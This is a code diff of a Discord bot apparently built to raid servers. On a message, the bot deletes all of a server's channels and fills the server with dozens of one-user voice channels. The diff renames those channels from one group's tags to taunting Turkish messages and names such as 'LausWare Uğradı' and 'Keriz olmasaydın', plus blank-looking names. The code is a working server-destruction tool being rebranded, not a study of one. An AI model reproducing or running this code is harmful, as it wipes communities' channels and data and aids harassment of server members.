@@ -50,7 +50,7 @@ client.on("message", async msg => {
 
     await msg.guild.channels.deleteAll();      
 
-    await msg.guild.createChannel("AxxA", {
+    await msg.guild.createChannel("TRroot", {
       type: "text"
     });
       await msg.guild
@@ -61,21 +61,21 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Clowsia Uğradı", {
+      .createChannel("LausWare Uğradı", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA Uğradı", { 
+      .createChannel("Chaves Uğradı", { 
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Clowsia Uğradı", {
+      .createChannel("Contra Uğradı", {
         type: "voice"
       })
       .then(chan => {
@@ -89,28 +89,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA Uğradı", {
+      .createChannel("TRroot Uğradı", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("Clowsia Uğradı", {
+      .createChannel("Keriz olmasaydın", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA Uğradı", {
+      .createChannel(" lausware bastı", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Clowsia Uğradı", {
+      .createChannel("İyi günler", {
         type: "voice"
       })
       .then(chan => {
@@ -124,14 +124,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA Uğradı", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {  
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Clowsia Uğradı", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
@@ -145,21 +145,21 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA Uğradı", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Clowsia Uğradı", {
+      .createChannel("᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA Uğradı", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
@@ -173,7 +173,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("Clowsia Uğradı", {
+      .createChannel("ahhhh", {
         type: "voice"
       })
       .then(chan => {
@@ -215,7 +215,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
@@ -230,21 +230,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("TRroot", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("Chaves", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("Contra", {
         type: "voice"
       })
       .then(chan => {
@@ -258,28 +258,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("Norex", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("LausWare", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
@@ -293,7 +293,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
@@ -315,21 +315,21 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
@@ -343,28 +343,28 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
@@ -378,14 +378,14 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
@@ -400,7 +400,7 @@ client.on("message", async msg => {
       });
     
             await msg.guild
-      .createChannel("AxxA", {
+      .createChannel("᲼᲼᲼᲼᲼᲼", {
         type: "voice"
       })
       .then(chan => {
